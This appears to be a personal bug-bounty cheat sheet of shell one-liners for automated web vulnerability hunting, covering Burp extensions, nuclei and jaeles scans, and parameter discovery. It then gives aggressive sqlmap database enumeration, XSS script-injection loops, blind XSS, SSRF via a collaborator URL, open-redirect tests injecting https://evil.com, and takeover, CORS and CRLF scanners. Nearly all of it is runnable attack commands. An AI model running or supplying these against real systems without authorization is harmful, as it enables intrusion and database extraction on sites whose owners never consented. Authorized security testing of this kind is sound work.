


1.burp 
extensions to install: 
Extender>BApp store>Reflected Parameters>Install
Extender>BApp store>Param Miner>Install
Extender>BApp store>Param authorize>Install
Extender>BApp store>Param autorepeater>Install
	ssrf reg: https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)
https://github.com/CoreyD97/BurpCustomizer/releases?source=post_page-----9cb181443464---------------------------------------
 Extender>BApp store>Burp Suite Scanner
 spider
 logger++

2.k_automation
./testing.sh (ensure we have live.txt)



4.cves 
refer cves/testing.txt


3.nuclei  and jaeles
1.normal templates
2.lost-templates
3.downloaded-templates




5.individual testing =>see below

-------------------------------------------------------------------1.AUTOMATION RUN BASED ON DOMAIN,SUBDOMAIN-------------------------------------------------------------------

1.run on domain name and subdomains names:

//nuclei
nuclei -l livedomains.txt  -s critical,high,medium,low -o nuclei_domain_out
nuclei -l livedomains.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_domain1_out
nuclei -l livedomains.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_domain1_out

//jaeles
jaeles scan -c 50  -U livedomains.txt
//output:out

2.run on js files:
//nuclei
nuclei -l jsurls.txt -s critical,high,medium,low -o nuclei_js_out
nuclei -l jsurls.txt -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_domain1_out
nuclei -l jsurls.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_domain1_out

//jaeles
jaeles scan   -U jsurls.txt

----------------------------------2.AUTOMATION RUN ON SPECIFIC URLS ACC TO VULNERABILITY : (RUN SPCIFIC TEMPLATES ALSO RUN ALL TEMPLATES...)----------------------------------------


2..GETTING PARAMETERIZED URLS:

	1.ParamSpider (Spidering + Regex):
	getting urls: paramspider -l livedomains.txt 
	       
	 2.Regex: 
	 cat all_urls.txt | grep -E '\?[^=]+=.+$' >>regex.txt (will identify all parametrized outputs)

	3.use lostfuzzer.sh:
	/home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/lostfuzzer.sh
        mv filtered_urls.txt loxs_param.txt

	combining all prams_urls:
	cat  out/* regex.txt loxs_param.txt | sort -u >> all_params.txt and use this in sql,xss,openredirection testing


# running nuclei,jaeles in parametrized urls...

//nuclei
nuclei -l all_params.txt  -s critical,high,medium,low -o nuclei_domain_out
nuclei -l all_params.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_domain1_out
nuclei -l all_params.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_domain1_out

//jaeles
jaeles scan  -U all_params.txt
//output:out


-------------------------------------------------------------------GENERAL BUGS AUTOMATION: (input: filtered_params_urls)
SQLI,XSS AND OD AUTOMATION:


#FINDING HIDDEN PARAMS
	cat params.txt | xargs -I % arjun -u "%" -oT hidden_params.txt

### **SQL Injection (SQLi) Automation**

        1.using sqlmap:
	sqlmap -m all_params.txt --level 5 --risk 3 --batch --dbs --tamper=between --random-agent
		
	
	3.nuclei: (input: filtered_params_urls)
	=>for sql:  cat sql.txt | nuclei -t /prsnl/errsqli.yaml
	=>for sql:  cat sql.txt | nuclei -t /prsnl/timesqli.yaml -dast
	
	nuclei -l filtered_urls.txt -t  "cves/202*/**" "vulnerabilities/sql/" -o sqli_results.txt -silent -rate-limit 200 -retries 2


### **Cross-Site Scripting (XSS) Automation**



	1.using parameterized output: (input: filtered_params_urls)
	cat urls.txt | grep -E '\?[^=]+=.+$' | sed 's/\(.*=\).*/\1<script>alert(1)<\/script>/' | xargs -I {} curl -s -k {}


	2.using dalfox. (input: filtered_params_urls)
	dalfox file params.txt --deep --blind xss.yourdomain.com
	dalfox -b <payload> file urls.xss


	3.paramspider -d target.com | qsreplace  '"/><script>confirm(1)</script>' > xss.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" 
	| grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done

### **Server-Side Request Forgery (SSRF) Automation**


        1.using qsreplace and ffuf : (input: filtered_params_urls)
	# Replace all query parameters with Burp Collaborator URL for SSRF detection
	cat params_url.ssrf | qsreplace <burp-collab> | tee ssrf_urls_ffuf
	# Perform SSRF scanning using ffuf
	ffuf -c -w ssrf_urls_ffuf -u FUZZ
	
	2.using nuclei: (input: filtered_params_urls)
		=>for blind ssrf:  cat or.txt | nuclei -t /prsnl/blind-ssrf.yaml  --retiries 2 --dast
		=>for ssrf:   cat or.txt | nuclei -t /prsnl/response-ssrf.yaml --retiries 2 --dast


### **Open Redirect (OD) Automation**

getting urls:
cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt


usimg httpx:

cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"

cat urls.txt | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"


using curl:

 cat urls.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}
 


using loxs tool:
cat urls.txt | sed 's/=.*/=/' | uro >loxs.txt =>idha ipo loxs toola use pnlaa


using nuclei:
cat subdomains.txt | nuclei -t openRedirect.yaml -c 30


using rust scanner:
cargo build
cargo run
refer automation/tools

aadvanced oneliner:

cat urls.txt | gf redirect | while read url; do
    cat loxs/payloads.txt | while read payload; do
        echo "$url" | qsreplace "$payload" | httpx -silent -fr -mr "google.com"
    done
done


	1.using curl:
	cat params_urls.txt | grep -E '\?[^=]+=.+$' | sed 's/\(.*=\).*/\1https:\/\/evil.com/' | xargs -I {} curl -s -k {}
	2.using nuclei: (input: filtered_params_urls)
	cat or.txt | nuclei -t /prsnl/openredirect.yaml --retries 2




* **Using Curl:**

  ```bash
  cat params_urls.txt | grep -E '\?[^=]+=.+$' | sed 's/\(.*=\).*/\1https:\/\/evil.com/' | xargs -I {} curl -s -k {}
  ```

* **Using Nuclei:**

  ```bash
  cat or.txt | qsreplace "https://evil.com" | anew open_redirects_payloads.txt
  cat open_redirects_payloads.txt | nuclei -t /prsnl/openredirect.yaml --retries 2 -rl 10 -bs 2 -c 2 -as -silent -o result.txt -json result.json -s critical,high
  ```

  * `qsreplace` is used to replace query parameter values with `https://evil.com` to test for open redirects.
  * `anew` ensures no duplicates are present in `open_redirects_payloads.txt`.
  * Nuclei will use `openredirect.yaml` to check for open redirect vulnerabilities.



#automate s3
s3:
nuclei -t s3-bucket-takeover.yaml -u http://<bucket-name>.s3.amazonaws.com


#rsubdomain takeover:
using nuclei:
nuclei -l domains.txt -t /http/takeovers/ -o out.txt
nuclei -l hosts.txt -t subdomain-takeover-detect-all-takeovers.yaml
using subzy:
subzy run -targets domains.txt


#automating wordpress:

nuclei -u https://target.com -t wordpress/
cat alive.txt | nuclei -t ~/nuclei-templates/technologies/wordpress-detect.yaml


#automating cors:
nuclei -l domains.txt -tags cors

#-------------------crlf--------------------------
using crlfi:
crlfi -i domains.txt

using crlfuzz:
crlfuzz -l domains.txt | tee -a output.txt
crlfuzz -l urls.txt | tee -a output.txt


using crlfsuite:
crlfsuite -iT domains.txt


about ax framework,ax tool for automation
